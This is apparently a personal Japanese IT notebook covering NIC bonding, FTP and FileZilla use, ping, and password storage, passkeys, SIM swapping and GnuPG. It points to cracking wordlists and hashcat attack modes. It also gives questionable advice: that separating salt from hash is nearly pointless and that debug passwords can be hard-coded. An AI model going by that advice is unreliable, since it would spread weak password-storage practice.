                    /etc/sysconfig/network-scripts/ifcfg-eth0 :
                        MASTER=bond0
                        SLAVE=yes
                    /etc/sysconfig/network-scripts/ifcfg-eth1 :
                        (ifcfg-eth0 と同様)
                概念:
                    ボンディング インターフェース:  #// 論理 NIC。結合したもの
                    スレーブ インターフェース:  NIC（例：eth0, eth1）
        LAN ケーブル: #keyword:
            LANケーブルの色は変えれるだけ変えたいですね
PBB: #keyword: PBB,  IEEE 802.1ah  #// 広域イーサネット・サービス網  https://xtech.nikkei.com/it/article/Keyword/20080212/293587/
    概要:
        従来のイーサネットフレームを別のイーサネットヘッダーでカプセル化（封入）する技術。
        I-TAG を追加し、プロバイダーネットワーク内でルーティングします。
        安定して確実に届けられます。高速化されるわけではありません。
    利点:
        スケーラビリティの向上: プロバイダーネットワーク内のMACアドレステーブルのサイズを大幅に削減
        顧客間の完全な分離: 異なる顧客のトラフィックが混在することを防止
        運用の簡素化: 顧客のネットワーク変更がプロバイダーネットワークに影響しない
FTP, SFTP: #keyword:  #// ファイル転送プロトコル。最近では主にホームページへ転送するのに使われます
    FileZilla: #keyword:  #// FTP アプリケーション。Windows, Linux, Mac  #ref: https://filezilla-project.org
        手順:
            インストール:
                ダウンロードします:
                    #ref: https://filezilla-project.org
                    FileZilla Client >> Apple Silicon 用（ARM 用）
                展開します:
                    FileZilla_3.67.0_macos-arm64.app.tar.bz2 を ダブル クリック します
                アプリケーション フォルダー に移動します:
                    Finder >> 移動 メニュー >> アプリケーション
                    で開いたフォルダーへ FileZilla を移動します
            初期設定:
                サイト を追加します:  #search: add FileZilla site
                表示状態をカスタマイズします:
                    - 表示 メニュー >> ローカル ディレクトリ ツリー = オフ
                    - 表示 メニュー >> リモート ディレクトリ ツリー = オフ
                    - 表示 メニュー >> ディレクトリの比較 >> 更新日時で比較
                    - 転送 メニュー >> 転送したファイルのタイムスタンプを維持
            接続: #keyword: FileZilla connect to server  #// サーバーに接続します
                クイック接続を使う場合:
                    アカウントを入力します:
                        FileZilla >> ホスト, ユーザー, パスワード（を入力：上）>> クイック接続 ボタン（上）
                        #ref: ${GitHub}/MyPrivateCode/FTP/script/try_ftp.sh
                    フォルダーを表示します:
                        ローカル: ____  #// 初回は、入力して Enter キー を押すと、関係ないフォルダーへのアクセス権を求められます。許可しないほうがよいでしょう
                        リモート: ____
                サイト マネージャー を使う場合:
                    追加: #keyword: add FileZilla site  #search: XServer FTP
                        メニュー: FileZilla >> ファイル メニュー >> サイト マネージャー >> 新しいサイト（左下）
                        一般 タブ:  #// デフォルト
                            名前の変更（左下）: __ReadableHostName__
                            ホスト: __HostName__
                            ユーザー: __FtpUserName__
                            パスワード: ____
                        詳細 タブ:
                            デフォルトの ローカル ディレクトリ: ____
                            デフォルトの リモード ディレクトリ: ____
                            同期ブラウジングを使用する: オン
                            ディレクトリの比較を有効にする: オン
                                #// オンにすると、新規ファイルやフォルダーは黄色い背景になります
                                #// 更新があるファイルやフォルダーは緑色の背景になります
                                #// 切り替えるには、表示 メニュー >> ディレクトリの比較 >> 有効
                        OK ボタン:
                    接続:  #search: FileZilla サイト マネージャー
            コピー: #keyword: FileZilla copy,  upload FTP files in FileZilla  #// フォルダーをアップロードまたはダウンロードします
                全てコピーする場合:
                    （初回のみ）サーバーを登録して接続します:
                        #search: add FileZilla site
                        #search: FileZilla connect to server
                    フォルダーをコピーします:
                        FileZilla でドラッグ＆ドロップします
                更新分だけコピーする場合: #keyword: FileZilla 更新 コピー,  FileZilla 差分 コピー
                    （初回のみ）サーバーを登録して接続します:
                        #search: add FileZilla site
                        #search: FileZilla connect to server
                    Git の更新情報を使う場合: #keyword: FileZilla git status  #// 🌟 推奨
                        git status で更新があったファイルを FileZilla で手動でアップロードしたら　git add していきます
                    FileZilla による差分コピーを使う場合:
                        性能: 殆ど上書きしないケースでも sage-p の転送には約5分かかります
                        上書き条件を設定します:
                            メニュー: 転送 メニュー >> ファイル存在時のデフォルトのアクション
                            ダウンロード: ファイルを上書き
                            アップロード: サイズが異なればファイルを上書き
                        コピーします:
                            ルート フォルダー >> すべてのファイルやフォルダーを選択 >>（右クリック）アップロード
                    （非推奨）:  #// ❗この方法では、孫ファイルの更新は差分として表示されません。
                        （無効なら）同期ブラウジングを有効にします: 🔃同期ブラウジングを切り替えます（上のボタン列の右側のグループ）
                        （無効なら）ディレクトリの比較を有効にします: 🔍ディレクトリ比較の切り替えです（上のボタン列の右側のグループ）
                        比較基準を選びます:
                            メニュー: FileZilla >> 表示 メニュー >> ディレクトリの比較
                            ファイル サイズ で比較: 改行コードや文字コードの違いがあると正しく動作しません
                            更新日時で比較: Git の ワーキング フォルダー では正しく動作しません
                        更新があるファイルをコピーします:
                            ファイルをドラッグ＆ドロップします（手動）
            比較, 同期チェック:  #keyword: FileZilla compare  #// ローカルとサーバーの間でファイルやフォルダーの内容が一致することを調べます
                （非推奨）手早く比較する場合:  #// ファイル サイズ または更新日時だけを比較します
                    ❗この方法では、孫ファイルの更新は差分として表示されません。
                    🔍ディレクトリ比較の切り替えです（上のボタン列の右側のグループ）
                    ルート フォルダー を表示して、すべてのファイルやフォルダーの背景に色が付いていないことを確認します
                完全に比較する場合:
                    ダウンロードして比較します（未確認）
                1つのファイルの内容を比較する場合:
                    - ファイルを右クリック >> 編集
                    - （初回のみ）ファイルの種類に関連づけられたプログラムがありません >>
                        カスタム プログラムを使用 >> "__EditorPath__"
        構成:
            サイト マネージャー >> サイト: #keyword: FileZilla サイト マネージャー
                追加:
                    #search: add FileZilla site
                接続:
                    FileZilla >> サイト マネージャー を開きます（上のボタン列の最も左）>> 接続
                ログを見る:
                    FileZilla >> 表示 メニュー >> メッセージ ログ（をオンにする）
                切断:
                    FileZilla >> 現在表示されているサーバーから切断（上のボタン列の中央あたり）
            ファイルやフォルダー:
                コピー:  #search: FileZilla copy
                比較:  #search: FileZilla compare
    NextFTP:  #ref: ${HOME}/Desktop/アカウント/NextFTP.txt
    Windows:
        Git bash に ftp コマンドが入っています
    Mac:
        brew install inetutils
    curl:
        FTP プロトコルを使ってダウンロードすることができます
        #ref: https://qiita.com/mom0tomo/items/384da47dee08a21c1ce5
    スクリプト:
        #// 未確認
        #ref: ${GitHub}/MyPrivateCode/FTP/script/try_ftp.sh
    プロバイダーの WebUI:
        XServer:  #search: XServer WebUI FTP
ping, icmp:  #keyword:  #// 対象サーバーまでネットワークが疎通されているかどうかを L3 レベルで確認します
    IP アドレス を指定した場合:  #// IP/ICMP プロトコル を使います
        成功する場合: |  #focus: time
            $ ping 192.168.34.52
                PING 192.168.34.52 (192.168.34.52) 56(84) bytes of data.
                64 bytes from 192.168.34.52: icmp_seq=1 ttl=64 time=1.31 ms
                64 bytes from 192.168.34.52: icmp_seq=2 ttl=64 time=1.74 ms
        失敗する場合: |  #focus: Unreachable, 20, 52
            $ ping 192.168.34.52
                PING 192.168.34.52 (192.168.34.52) 56(84) bytes of data.
                From 192.168.34.20 icmp_seq=10 Destination Host Unreachable    ... DNS
                From 192.168.34.20 icmp_seq=11 Destination Host Unreachable
    ホスト名を指定した場合:  #// TCP/IP で DNS にアクセスしてから、IP/ICMP プロトコル を使います
        成功する場合: |  #focus: time
            $ ping server2.example.com
                PING server2.example.com (192.168.34.23) 56(84) bytes of data.
                64 bytes from server2.example.com (192.168.34.23): icmp_seq=1 ttl=64 time=2008 ms
                64 bytes from server2.example.com (192.168.34.23): icmp_seq=2 ttl=64 time=1008 ms
                64 bytes from server2.example.com (192.168.34.23): icmp_seq=3 ttl=64 time=9.39 ms
        指定したホストがネットワークに無い場合: |  #focus: Unreachable, dns, server2
            $ ping server2.example.com
                PING server2.example.com (192.168.34.23) 56(84) bytes of data.
                From dns.example.com (192.168.34.20) icmp_seq=39 Destination Host Unreachable
                From dns.example.com (192.168.34.20) icmp_seq=40 Destination Host Unreachable
    しくみ: IP/ICMP プロトコルを使います。ポート番号はありません（ポート番号は IP/TCP の概念なので）
        #ref: https://monaski.hatenablog.com/entry/2017/03/26/223731
    関連: #search: ACL 疎通確認
mail:  #keyword: e-mail
    __user__@localhost :  #search: e-mail  __user__@localhost
MIME type, メディア タイプ:  #keyword:  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types
    Content-Type: #keyword:  #// HTTP ヘッダーに指定する MIME type  #ref: https://developer.mozilla.org/ja/docs/Web/HTTP/Headers/Content-Type
セキュリティ: #keyword: security
    ID, 個人情報: #keyword:
        個人情報:  #// 何が個人情報であるのか
            狭義: 氏名、住所、生年月日
            携帯電話: 携帯電話番号、契約先事業者名  #search: SIM スワップ攻撃
            インターネットバンキング: ID、パスワード
        ID の漏洩の影響:
            ID単体公開:
                個人情報を抜いてから割当てたIDだけを全公開しても個人情報は直接はバレない
            ID から有効性確認:
                個人情報を知っている人がその有効性を確認するサービス
            ID から個人情報取得:
                IDだけ知っている人が新たに個人情報を得る
            ID と個人情報のリストの取得:
                #ref: https://twitter.com/ts_neko/status/1572081654449176577
        個人情報保護: #keyword:
            匿名加工情報: #keyword:
                概要:
                    #ref: https://bengoshi-sakao.com/column/匿名加工情報と統計情報の違いは何か/
                    - 個人情報から特定の個人を識別できないように（かつ復元することもできないように）加工して作成された情報です。
                    - 例えば、個人情報データベースから、氏名を削除したり住所や生年月日等を抽象化することで、特定の個人を識別できないように加工して作成されます。
                    - 事業者に一定の義務（個人情報保護法43条～46条）
                    - 加工前の情報や他の個人情報を持つ提供元でも特定できてはダメ
                    - 本人の同意なく第三者へ提供可能
                匿名加工処理: #keyword: data anonymization, 匿名加工処理
                    #ref: https://bengoshi-sakao.com/column/匿名加工情報に求められる匿名化の程度とは/
                    (1) 特定の個人を識別することができる記述等の削除・置き換え
                        例）氏名の削除、住所を市町村までに置き換え
                    
                    (2)個人情報に含まれる個人識別符号（マイナンバー等）の全部削除・置き換え
                        例）マイナンバーの全部削除
                    
                    (3)個人情報と連結する符号（ID、ナンバーなど）の削除・置き換え
                        例）管理ナンバー、IDの全部削除
                    
                    (4)特異な記述等を削除・置き換え
                        例）症例数の極めて少ない病歴を削除する、年齢が「116歳」という情報を「90歳以上」に置き換える
                    
                    (5)前各号に掲げる措置のほか、適切な措置
                        例）移動履歴を含む場合、自宅や職場などの所在が推定できる位置情報（経度・緯度情報）
                    #// 通常、テーブル固有のIDなど、レコードを特定する情報を付けて運用されます
                    #// 経済産業省 匿名加工情報作成マニュアル  #ref: https://www.meti.go.jp/policy/it_policy/privacy/downloadfiles/tokumeikakou.pdf
            仮名加工情報: #keyword:  #// 匿名加工情報より加工が少ない
                概要:
                    #ref: https://web-lawyers.net/anonymously_processed_information/#a3
                    - 他の情報と照合したときに個人を識別することができてもよい
                    - 利用目的を公表する義務がある
                    - 第3者提供は禁止。継承者や共同者は条件付きで可
                    - 漏えい等を防止するための対策が必須（義務）
                仮名加工処理:
                    - 個人情報に含まれる記述等の一部を削除するか、復元することのできる規則性を有しない方法によって置き換えること
                    - 個人識別符号の全部を削除するか、復元することのできる規則性を有しない方法によって置き換えること
            統計情報: #keyword:
                ある程度の規模以上の集合に関する属性
                #ref: https://bengoshi-sakao.com/column/匿名加工情報と統計情報の違いは何か/
            参考:
                #ref: https://bengoshi-sakao.com/column/匿名加工情報と統計情報の違いは何か/
                #ref: https://bengoshi-sakao.com/column/匿名加工情報に求められる匿名化の程度とは/
                #ref: https://web-lawyers.net/anonymously_processed_information/
        広告識別子: #keyword:  #// IDFA (Apple), AAID, GAID (Google) , フィンガー プリント
            概要:
                - 端末を識別するために生成された一意の英数字の組み合わせ。端末とユーザーを紐づける
                - 広告のターゲティングと、広告の効果計測のため
            CookieID:
                ブラウザーに対してサーバサイドで割り当てるID
            広告識別子を使わない測定:
                AppleのSKAdNetworkに対応したGoogle Mobile Ads SDKバージョン7.64以降
                #ref: https://gigazine.biz/word-advertising-identifier/
            フィンガー プリント:
                - フィンガー プリント（スマホの使用状況）からユーザーを特定する
                - システムの稼働時間やユーザーの位置、キーボードの言語、バッテリーの状態、デバイスのモデルなど
                    いくつかのシグナルを通知機能から集めてサーバーに送信してユーザーを特定する
                - iOS では禁止されているが
                    #ref: https://gigazine.net/news/20240128-ios-app-privacy-concerns-push-notifications/
        GDPR: #keyword:
            #ref: https://www.hitachi-solutions.co.jp/hibun/sp/column/leakage/03.html
            欧州。EU GDPR, UK GDPR
        APEC CBPR:
            APEC の地域。プライバシーマークを基軸とした対応
        BCR:  #ref: https://www.iij.ad.jp/bcr/  #// 一般公開情報
            個人データ保護方針を文書化したBCR（Binding Corporate Rules：拘束的企業準則）。
            データ保護監督機関より承認
    認証, パスワード: #keyword: Authentication
        パスワード: #keyword: password
            入力:  #keyword: input password  #search: secret
                シェルの環境変数に設定します:
                    bash の場合: |
                            read -s -p "Enter password: "  PASSWORD
                                #// パスワードを入力します。-s オプションによりパスワードは表示されません
                                #// 上記の場合、環境変数 PASSWORD にパスワードを代入します。
                                #// 古い Korn シェル（bash シェルではない）では -s オプションは ヒストリー・ファイルに保存してしまうので注意
                                #// -p オプションによりユーザーが値を入力します
                            __CryptCommand__ "${PASSWORD}"
                        #ref: ${typrm_files}/ref/Network-AI.yaml#client password from AI
                    zsh の場合: |
                            read -s "?Enter password: " PASSWORD
                                #// パスワードを入力します。-s オプションによりパスワードは表示されません
                                #// 古い Korn シェル（bash シェルではない）では -s オプションは ヒストリー・ファイルに保存してしまうので注意
                                #// ? によりプロンプトを表示します
                            __CryptCommand__ "${PASSWORD}"
                    注意: スクリプトで環境変数の値を設定してはいけません。たとえば、クラウドの中のパスワードを保存できる環境変数を設定する項目に設定します
                ファイルに出力します: #keyword: make password file
                    場所:  #search: password store path
                    bash の場合: |
                        PasswordFile=~/.secret/____
                        read -s -p "Enter password: "  _x  &&  echo "${_x}" > ${PasswordFile};  unset  _x  #search: make password file
                        chmod 600  ${PasswordFile}
                        unset  PasswordFile
                起動時にユーザーに入力させます:
                    #ref: ${typrm_files}/ref/Network-AI.yaml
                自動入力:  #// .env ファイルなどに保存します  #search: save password
                お客様へ初期パスワードを渡すとき:
                    ふりがなを付ける, 0とOの両方の可能性をなくす（Oは使わない）, 糊付けした折りたたみハガキを使う
                #search: パスワード漏洩リスク
            環境変数:  #keyword: secret environment
                クラウドに設定する場合:  #search: cloud secret
                CLI や WebUI で入力する場合:  #search: input password
                ファイルに保存する場合:  #search: save password
            保存: #keyword: save password
                （参考）:  #search: secrets
                クライアント: #keyword: client password  #// プロセスが何かのクライアントとして動くときのパスワードを指定します。
                    注意: スクリプトの中にパスワードを平文で保存しないようにしてください
                    Linux パスワード:  #search: Linux password
                    パスワードの指定方法:  #search: input password  #search: secret
                ファイル >> シークレット, .env: #keyword: password store path  #search: bash .env  #// クライアントからサーバーにアクセスするときのパスワードのファイル
                    環境変数:
                        .env:  #search: bash .env
                        シークレット を扱う WebUI:  #search: cloud secret
                    SSH キー:
                        ~/.ssh  #search: SSH キー
                    secrets フォルダー, ~/.secrets: #keyword:  #// アクセス制限されたリポジトリから一時的にダウンロードしたもの
                        場所: 特定の一時フォルダーとリポジトリ
                        内容: パスワード, PAT, API キー など
                    保存手順:  #search: make password file
                    #search: Secret Zero Problem
                メモリー: #keyword: password variable  #// メモリーにのみパスワードを保存する。ワンタイム パスワード や一定時間入力不要にする場合
                    bash の環境変数を unset しても参照元が無くなるだけで、メモリーには残ります。メモリーを覗けば見つけられる可能性が無くもありません。
                    メモリーに保存しないためには ssh などへ直接入力する方法があります。
                    #ref: ${typrm_files}/ref/Linux-AI.yaml#label: password variable
                    #search: debug password
                サーバー:  #// クライアントのパスワードを認証するときに使うデータをサーバーに保存します
                    クラウドに設定する場合: #keyword: cloud secret
                        #// 正規の多くのクラウドの WebUI に設定する環境変数は暗号化されています
                        GitLab CI/CD 環境変数:
                    ファイルやデータベースに保存する場合: #keyword: database secret
                        注意: スクリプトの中にパスワードを平文で保存しないようにしてください
                        概要: パスワードにソルトやハッシュを加えてハッシュ関数に何度も渡した出力値（ハッシュ）をレコードに保存します
                        ハッシュ関数: パスワード＋ハッシュなどからハッシュを出力する関数。不可逆。SHA-256 など  #keyword:
                            #// 関連  #search: 暗号方式
                        ハッシュ: パスワードの代わりに保存する値  #keyword: ハッシュ,  ハッシュ値,  メッセージ ダイジェスト  #ref: https://www.jipdec.or.jp/project/research/why-e-signature/PKI-crypto-mechanism.html
                        ソルト: #// ハッシュ関数に渡すパスワードに繋げるランダムな文字列。ユーザーごとに分ける。 #keyword:
                            パスワードの平文を推測されにくくするための文字列。
                            ソルトとハッシュをフィールドで分けると、1レコード1回計算が増えるだけなのであまり意味ないです。
                            ソルトとハッシュの文字を混ぜて保存すべき。
                        ペッパー: ハッシュ関数に渡すパスワードに繋げるランダムな文字列。テーブルのパスワードに相当する  #keyword:
                        ストレッチング: ハッシュ関数を繰り返し実行すること  #keyword:
                        Node.js: #search: Node.js crypto hash
                        参考: #ref: https://twitter.com/Ts_Neko/status/1461097717770461194?s=20
                USB メモリー:
                紙:
                    _: パスワードを紙で保有することを明確には禁止してません（NISCは推奨）
                    メリット:
                        - サイバー攻撃されない（紙だから）
                    デメリット:
                        - 情報セキュリティの観点で、物理的に盗難、紛失、漏えいのリスクがある
                            → 鍵付きの場所に保管等、アクセス制限
                        - 変更管理が困難（新PWに直さない）
                    #ref: https://x.com/oryzae1824/status/1873609032197722462
                パスワード漏洩リスク:  #search: パスワード漏洩リスク
                Secret Zero 問題:  #search: Secret Zero Problem
            パスワードの条件, 初期パスワード発行:  #// ユーザーが設定できるパスワードの条件
                #ref: https://www.ipa.go.jp/files/000017316.pdf#page=57
            ワンタイム パスワード: #keyword:  #// 一度認証したら無効になります
            デバッグ用パスワード:  #keyword: debug password
                概要:
                    デバッグ設定のときは、ハード コーディング されたパスワードを使うと便利です。
                    ただし、デバッグ設定はコードに埋め込むなど、保護されている場所で設定する必要があります。
                スクリプトでのサンプル:
                    encrypt-and-decrypt.sh ファイル内: |
                        DebugTransfer="no"  #// "yes" or "no"
                        if [ "${DebugTransfer}" == "no"  -a  "${TransferPassword}" == "" ]; then
                            TransferPassword="$( openssl rand -base64 48 )"
                        fi
                    デバッグ実行する場合:
                        encrypt-and-decrypt.sh:
                            DebugTransfer="yes"
                        bash:
                            TransferPassword=__Random00fwea8Q#r3nr1fa__  encrypt-and-decrypt.sh
                関連:
                    #search: password variable
                    #search: delayed scp
            パスワード ペア 方式: #search: パスワード 補充
            生成:  #keyword: new password pair,  パスワード 補充
                パスワード ペア 生成機:  #// iPhone のブックマークに new password があります。Crypto API 使用
                    - 下記リンク先に新しいパスワード（片方）が表示されます
                    - VSCode に溜めていき、半分を後半に移動させます  #// Google Docs に貼り付けると書式がずれます
                    #ref: https://tzneko.com/create-pass.html
                    #ref: ${GitHub}/homepage/public_html/create-pass.html
                パスワード ペア 方式: #search:
            漏洩リスク: #keyword: パスワード漏洩リスク  #ref: https://circleci.com/docs/ja/security-recommendations/
                漏洩する場所:
                    CLI:
                        コマンド履歴:
                        プロセスの引数: (ps aux)
                        コンソールの出力: (clear)
                    ログ, アーティファクト:
                        サービスの実行ログ:
                        CI/CD の実行ログ:
                            実行ログへの意図しない露出
                            CI/CD の設定ファイルの漏洩も
                        CI/CD が作ったもの:
                        システムのログ: (sudo)
                    コード:
                        CI/CD の設定ファイル:
                        外部スクリプト:
                            ネットにあるスクリプトにシークレットを渡さないこと
                    ストレージ単体:
                        一般的なストレージ:
                        共有設定ミス:
                    開発者への ソーシャル エンジニアリング 攻撃:
                    紙のメモ:
                リスク軽減:
                    書く場所のリスクの高い順:  #// 組織のリスク許容度による
                        CI/CD の設定ファイル。コードへのシークレット埋め込み
                        CI/CD の変数設定（保護なし）
                        CI/CD の変数設定（保護あり）
                        外部シークレット管理ツール（Vault、AWS Secrets Manager等）
            クラッキング: #keyword: パスワード クラッキング, パスワード 回復 攻撃
                総当たり攻撃: #keyword:
                辞書ベース攻撃: #keyword:
                その他の攻撃:  #ref: https://hashcat.net/wiki/#core_attack_modes
                現在の実力:
                    sha512crypt: 13〜79時間
                    #ref: https://weakpass.com/wordlist
                ハードウェア:  #ref: https://gigazine.net/news/20240203-building-password-cracker/
            事前に入力する場合:  #search: pre-enter password  #// ダウンロードする内容を取得するのにパスワードが必要でも、取得するタイミングでパスワードを入力できない場合。自動化のときなど
        サービスのパスワード:  #// サービスが別のサーバーに自動的にログインするときに使われるパスワードは基本的に設定しません。その代わり、別の対策をします
            パスワード: 設定しません  #// 毎回人が入力するわけにはいかないため。その代わり、別の対策をします
            認可する範囲を狭めます:
                鍵を盗まれても、サービスが行う処理しかできないようにします（理想的）
            鍵へのアクセス権:
                権限がある人（パスワード）にしか、秘密鍵にアクセスできないようにします
            鍵の有効期限:
        パスワードレス認証: #keyword: passwordless  #// FIDO認証など。 認証の三要素のうち、知識情報を使わない認証。所持情報と生体情報のみ使う認証
            _: MFA の一種
            FIDO認証: #keyword:  #// Fast Identity Online 認証
                手順:
                    認証器を登録します:
                        ユーザー検証と鍵生成: 生体情報で認証し、秘密鍵と公開鍵を生成
                        公開鍵をサーバーに登録:
                    認証器を使ってユーザー認証します:
                        チャレンジをサーバーで生成:
                        ユーザー検証と署名: 生体情報で認証し、チャレンジを秘密鍵で署名
                        サーバーで認証: 公開鍵で署名付きチャレンジを開けて判定
                安全性:
                    生体情報は成りすましが難しく, 所持情報は偽造が難しいため安全。
                    漏洩しやすい知識情報は使わないため安全。
                トラブル対応:
                    端末を紛失したとき:
                        - 別の認証器に変更する手続きの用意
                        - 紛失した認証器の無効化
                    端末が故障したとき:
                        - カメラが故障したとき
                        - 認証器が故障したとき
                マルチデバイス対応FIDO認証資格情報: #keyword: FIDO認証, パスキー Passkeys
                    概要:
                        端末アカウントに紐付けられたパスワードの自動生成とローミング
                        #ref: ${typrm_files}/ref/Network-AI.yaml#label: pass key
                    パスキーの有効範囲:
                        サイトごとのパスキー:
                            サイト（URL のドメイン）ごとにパスキーを生成できます、
                        ベンダーごとのパスキー:
                            1つのアカウントに、ベンダーごとに異なる複数のパスキーを関連づけることができるらしい
                    認証器: #// Authenticator, FIDO対応デバイス
                        FIDOに対応した生体認証を行う
                    生成, ローカル認証:
                        ローカル認証を行って秘密鍵と公開鍵のペアを作成し、秘密鍵をデバイス内に置き、公開鍵をサーバーに送信します。
                    同期鍵:
                        一部の鍵情報を「同期鍵」としてクラウド上で管理し、各種デバイス間で同期。
                        つまり実質、Apple ID などのベンダーのアカウントにパスキーは保存されるが、ローミングができる。
                    ローミング, 相互利用:
                        認証デバイス間でQRコードとBluetooth通信を利用して「同期鍵」を相互利用
                        自身のスマートデバイス（認証デバイス）が手元に無い状況であっても、異なるベンダーのスマートデバイスを利用して「パスキー」による認証が利用できるようになります
                        Windows でサイトにログインするときに iPhone で認証するときもこれか？
                #ref: https://www.ogis-ri.co.jp/column/themistruct/c106538.html
        認証の三要素: #keyword:  #// 知識情報, 所持情報, 生体情報
            知識情報: パスワード, PIN
            所持情報: IC カード, スマホ, SIM, メール アドレス, 電話番号, ハードウェア トークン
            生体情報: 指紋, 顔, 網膜, 音声
            マジックリンク: 有効回数, 有効期限
        SIM 認証: #keyword: SIM 認証, SIM スワップ攻撃 詐欺
            概要:
                スマホの SIM カード を所持情報として使う認証。
                ただし、SIM スワップ によって安全ではなくなってきている。
                被害者の携帯電話は使用できなくなる。
                #ref: https://therecord.media/sim-swapping-lapsus-cyber-safety-review-board-report
                #ref: https://ja.wikipedia.org/wiki/SIMスワップ詐欺
                #ref: https://gigazine.net/news/20240207-sim-swap-attaks-sms-based-login/
            対策:
                個人で取れる対策:  #ref: https://ja.wikipedia.org/wiki/SIMスワップ詐欺#個人で取れる対策
                    公開しない: 氏名、住所、生年月日等、携帯電話番号、契約先事業者名、インターネットバンキングのID、パスワード
                謎の Yahoo 確認コード 6桁: #keyword: 謎の Yahoo! 確認コード
                    yahoo 確認コード 覚えがない
                    Yahoo!JAPANにログインしていればこちらから確認できます。
                    https://id.yahoo.co.jp/security/login_history.html
                    メッセージの情報を、他人に教えない限りログインする事は出来ません。
                    なので、削除して終わりです。残念ながら特に対策は無いですね。
                    https://detail.chiebukuro.yahoo.co.jp/qa/question_detail/q13296678478
        MFA, 多要素認証: #keyword:
        PGP: #keyword:  #// Pretty Good Privacy
            OpenPGP, RFC 4880: #keyword:
            GnuPG, GPG 署名: #keyword:  #// GNU Privacy Guard, OpenPGP の GNU 実装版  #ref: https://www.gnupg.org
                概要 >> 何を信頼できるのか:  #// 秘密鍵が漏洩されていない場合
                    同じ キーID で署名されたもの: それらが 2つ以上ある場合、それらは同じ人が署名（確認や登録など）をしています。
                        キーID → 人（ユーザー）。
                        ただし、秘密鍵の合鍵を他の人に渡していないことを証明する必要があります
                    同じユーザーIDで署名されたもの: キーID → ユーザーID の関連に信憑性があれば、同じ人が署名（確認や登録など）をしています
                    同じ名前で署名されたもの: 同姓同名の可能性が少しだけあります
                    メールアドレス:
                        ユーザーID → キーID → 検証済みメールアドレス: この関連の信憑性は、その関連を保証する人によって保証されます
                        検証済みメールアドレス: ある キーID の鍵に書かれたメールアドレスに何か送って受け取れた場合、
                            その キーID の鍵の所有者はメールアドレスを受け取った人として検証済みメールアドレスとして信頼できます。
                            ただし、他の人がメールアドレスを見た場合は証明できません。
                    ユーザーに関するその他の情報: キーID → ユーザーID → ユーザーに関する情報 の関連の信憑性は、その関連を保証する人によって保証されます。
                        利害関係者によって保証された場合は、信憑性はありません
                    目の前にいる人: 本人確認したい目の前にいる人に名前を聞いて、
                        「ユーザーID → キーID → 名前」もしくは「ユーザーID → 名前」と一致したら、
                        目の前にいる人はその ユーザーID の本人として信頼できます
                手順:
                    インストールします: #keyword: install GPG  #// GPG をインストールします
                        Windows: #keyword: GPG Windows  #// Kleopatra (GUI) もインストールします
                            Git bash を使う場合:
                                #// Git bash に gpg コマンドは入っています
                                インストールします:
                                    #search: install Git bash
                                インポートする場合:
                                    #search: import GPG
                                #// 以下に続きます
                            Kleopatra (GUI) を使う場合: #keyword: install Kleopatra
                                ダウンロードします:
                                    https://www.gnupg.org >> Download タブ >> Download >> Windows（をページ内検索）>>
                                    Gpg4win >> $0 >> Download
                                インストールします:
                                    - ダウンロードしたファイル（例：gpg4win-4.1.0.exe）を開きます
                                    - インストール オプションはデフォルトを使用
                                インポートする場合:  #// 開いた Kleopatra を使います
                                    #search: import GPG
                                開いた Kleopatra を閉じます:
                                #// 以下に続きます
                            （必要なら）Visual Studio Code を再起動します:
                                #// Terminal の新規作成では PATH は更新されません
                                gpg --version
                            （必要なら）git で秘密鍵を使うように設定します:
                                #search: Git signed commit
                            #ref: https://www.kkaneko.jp/tools/win/gnupg.html
                        mac:
                            #ref: https://www.gnupg.org/download/index.html >> binary releases >> Mac GPG
                            GnuPG for OS X:  #ref: https://sourceforge.net/p/gpgosx/docu/Download/ >> Long Term Support version (LTS) >>
                                disk image をダウンロードします:
                                ダウンロードしたファイルの SHA256 をチェックします:
                                    シェル:
                                        sha1sum ____/GnuPG-2.4.7.dmg
                                        shasum -a 256 ____/GnuPG-2.2.36.dmg
                                インストールします:
                                    GnuPG-2.2.36.dmg をダブルクリック >> Install.pkg（をダウンロードにドラッグ＆ドロップ）>>
                                    Install.pkg（を右クリック）>> このアプリケーションで開く >> インストーラ（デフォルト）>> 開く
                                    #search: open mac blocked application
                                バージョンを確認します:
                                    シェル:
                                        gpg --version
                            GPG_Suite:
                                #ref: https://gpgtools.org
                                GPG_Suite-2022.2.dmg （をダブルクリック）>> Install（をダブルクリック）
                                #ref: https://gpgtools.tenderapp.com/kb/how-to/first-steps-where-do-i-start-where-do-i-begin-setup-gpgtools-create-a-new-key-your-first-encrypted-email
                    GitHub に登録します:  #search: register GitHub GPG
                    一覧, 鍵の内容の表示します:  #// 鍵の所有者名とそのメールアドレスと作成日を一覧表示します
                        コマンド: #keyword: gpg --list-secret-keys,  GPG email
                            gpg --list-secret-keys
                        出力例: |
                            sec   rsa3072 2022-11-11 [SC] [expires: 2024-11-10]
                                57FF980CF5F2E902A7BC7840E8099F204C43F3F7
                            uid           [ultimate] user1 <user1@example.com>
                            ssb   rsa3072 2022-11-11 [E] [expires: 2024-11-10]
                        説明:  #// 上記出力例の説明。本人だけが持っている鍵の説明。偽装できません
                            キーID: #keyword: GPG key ID
                                (上記出力例の末尾8桁の) 4C43F3F7 または (末尾16桁の) E8099F204C43F3F7
                                または 57FF980CF5F2E902A7BC7840E8099F204C43F3F7
                                #// 完全な ID は gpg --list-secret-keys コマンドで確認できるので、普段は 4C43F3F7 を ID として使います
                            鍵の所有者の名前: user1
                            鍵の所有者のメールアドレス: user1@example.com
                        鍵の生データ: #keyword: GPG raw data
                            export すると見えます  #search: export GPG
                        実際の期限:  #search: my GPG key expires
                    新規作成します: #keyword: create GPG  #// 鍵を作ります
                        パスフレーズを決めます:
                            ヒントをメモします  #// PGP 2022-11-19
                            #// 後でパスフレーズを入力するときに1分以上入力しないとキャンセルされてしまうため、ここで決めます
                        シェル: gpg --generate-key
                        Real name: ____  #// 鍵の所有者の名前。本当の名前でなくても良い。
                        Email address: ____  #// 受け取れるメールアドレスが良い
                        Change (N)ame, (E)mail, or (O)kay/(Q)uit?: O
                        Passphrase: ____
                        Repeat: （同上）
                        #// 新規作成されたら、鍵のID と失効証明書の場所が表示されます
                        （参考）失効証明書, revocation certificate: ~/.gnupg/openpgp-revocs.d/____.rev
                            #// このファイルの中に Real name, Email, 公開鍵, 有効期限, 秘密鍵 が書かれています。通常は不要なようです
                    期限を更新します: #keyword: extend GPG
                        #// 鍵を更新してから、別の PC にコピーした鍵をその別の PC で更新しても同じ鍵になります。GitHub の認証も通ります
                        鍵の一覧を表示して、更新する鍵を特定します:
                            gpg --list-keys
